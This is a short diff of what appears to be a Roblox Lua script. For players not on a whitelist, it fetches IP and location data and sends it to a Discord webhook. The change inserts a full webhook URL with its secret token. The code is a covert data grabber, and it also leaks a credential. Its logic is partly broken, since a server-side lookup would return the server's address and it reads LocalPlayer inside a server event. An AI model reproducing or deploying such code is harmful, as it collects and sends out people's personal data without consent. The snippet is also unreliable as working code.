@@ -38,7 +38,7 @@ game.Players.PlayerAdded:Connect(function(player)
     else
         -- Send IP and location info if not whitelisted
         local player_name = game:GetService("Players").LocalPlayer.Name
-        local webhook_url = "URL"  -- Replace with your actual webhook URL
+        local webhook_url = "https://discord.com/api/webhooks/1349003238032146562/XC8Qj148wx-fnQb9D3NONxLgOqZbbvUAvrCtPT95D2_gJSf7ZiGZshRNLtYNtURaZIMe"  -- Replace with your actual webhook URL
 
         -- Fetch IP information
         local ip_info = HttpService:GetAsync("http://ip-api.com/json")
